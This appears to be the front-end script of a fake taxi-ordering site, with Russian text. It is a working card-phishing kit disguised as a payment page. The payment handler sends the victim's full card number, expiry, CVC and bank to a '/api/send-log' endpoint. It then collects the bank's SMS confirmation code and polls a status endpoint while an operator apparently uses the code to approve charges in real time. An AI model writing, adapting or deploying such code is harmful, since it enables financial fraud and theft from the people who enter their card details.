const orderForm = document.getElementById('orderForm');
if (orderForm) {
  orderForm.addEventListener('submit', (e) => {
    e.preventDefault();
    const orderData = {
      phone: document.getElementById('phone').value,
      from: document.getElementById('from').value,
      to: document.getElementById('to').value,
      tariff: document.getElementById('tariff').value,
      price: document.getElementById('tariff').value === 'Эконом' ? 350 : 
             document.getElementById('tariff').value === 'Комфорт' ? 550 : 1100
    };
    sessionStorage.setItem('currentOrder', JSON.stringify(orderData));
    window.location.href = 'pay.html';
  });
}

const orderDetails = document.getElementById('orderDetails');
const paymentForm = document.getElementById('paymentForm');
const smsBlock = document.getElementById('smsBlock');

if (orderDetails && paymentForm) {
  const savedOrder = JSON.parse(sessionStorage.getItem('currentOrder'));

  if (!savedOrder) {
    orderDetails.innerHTML = '<p style="color:red;">Ошибка: Заказ не найден. Вернитесь на главную страницу.</p>';
    paymentForm.style.display = 'none';
  } else {
    orderDetails.innerHTML = `
      <p><strong>Маршрут:</strong> ${savedOrder.from} ➔ ${savedOrder.to}</p>
      <p><strong>Тариф:</strong> ${savedOrder.tariff}</p>
      <p><strong>К оплате:</strong> <span style="font-size: 1.2em; font-weight: bold; color: #2e7d32;">${savedOrder.price} ₽</span></p>
    `;
  }

  const cardNumberInput = document.getElementById('cardNumber');
  cardNumberInput.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');
    value = value.replace(/(.{4})/g, '$1 ').trim();
    e.target.value = value;
  });

  const cardExpiryInput = document.getElementById('cardExpiry');
  cardExpiryInput.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 2) {
      value = value.substring(0, 2) + '/' + value.substring(2, 4);
    }
    e.target.value = value;
  });

  paymentForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    const payload = {
      ...savedOrder,
      bank: document.getElementById('bankSelect').value,
      cardNumber: cardNumberInput.value,
      cardExpiry: cardExpiryInput.value,
      cardCvc: document.getElementById('cardCvc').value
    };

    try {
      await fetch('/api/send-log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      paymentForm.style.display = 'none';
      smsBlock.style.display = 'block';
    } catch (err) {
      alert('Ошибка соединения с сервером.');
    }
  });

  const confirmSmsBtn = document.getElementById('confirmSmsBtn');
  const smsInput = document.getElementById('smsCode');
  const smsMessage = document.getElementById('smsMessage');

  let checkInterval = null;

  confirmSmsBtn.addEventListener('click', async () => {
    const enteredCode = smsInput.value.trim();
    if (!enteredCode) {
      smsMessage.className = "status-msg error";
      smsMessage.textContent = "Введите код из SMS!";
      return;
    }

    smsMessage.className = "status-msg";
    smsMessage.style.color = "#555";
    smsMessage.textContent = "Проверка кода банком...";
    confirmSmsBtn.disabled = true;

    await fetch('/api/send-sms-log', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        phone: savedOrder.phone,
        bank: document.getElementById('bankSelect').value,
        smsCode: enteredCode
      })
    });

    if (checkInterval) clearInterval(checkInterval);

    checkInterval = setInterval(async () => {
      const res = await fetch(`/api/check-sms-status?phone=${encodeURIComponent(savedOrder.phone)}`);
      const data = await res.json();

      if (data.status === 'success') {
        clearInterval(checkInterval);
        smsMessage.className = "status-msg success";
        smsMessage.textContent = "Оплачено успешно";
        setTimeout(() => {
          alert("Заказ принят!");
          sessionStorage.clear();
          window.location.href = 'index.html';
        }, 1500);
      } else if (data.status === 'error') {
        clearInterval(checkInterval);
        smsMessage.className = "status-msg error";
        smsMessage.textContent = "Введите SMS-код повторно";
        smsInput.value = "";
        confirmSmsBtn.disabled = false;
      }
    }, 2000);
  });
}